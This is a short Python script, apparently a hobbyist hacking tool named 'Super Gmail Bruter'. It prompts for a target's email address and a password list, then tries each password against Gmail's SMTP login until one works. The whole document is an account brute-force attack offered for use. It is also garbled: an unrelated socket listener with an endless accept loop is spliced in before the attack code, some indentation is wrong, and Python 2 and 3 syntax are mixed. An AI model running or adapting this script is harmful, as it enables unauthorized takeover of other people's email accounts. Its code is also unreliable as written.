import smtplib
import socket
smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
smtpserver.ehlo()
smtpserver.starttls()

s = socket.socket() 
host = socket.gethostname() 
port = 587
s.bind((host, port)) 

s.listen(5) 
while True:
	c, addr = s.accept() 
	print ('Got connection from',addr)
c.send('Thank you for connecting')
c.close()

print("==========================================")
print("------- Super Gmail Bruter ------- \n")
print("==========================================")
print("+++++++++++++++++++++")
print("created by Eli Hacks ")
print("+++++++++++++++++++++")

user = raw_input("[✓] Enter the target's email address: ")
passwfile = raw_input("[✓] Enter the password file name: ")
passwfile = open(passwfile, "r")

for password in passwfile:
	try:
		smtpserver.login(user, password)

		print("[+] Password Found: %s" % password)
		break;
	except smtplib.SMTPAuthenticationError:
		print("[!] Password Incorrect: %s" % password)
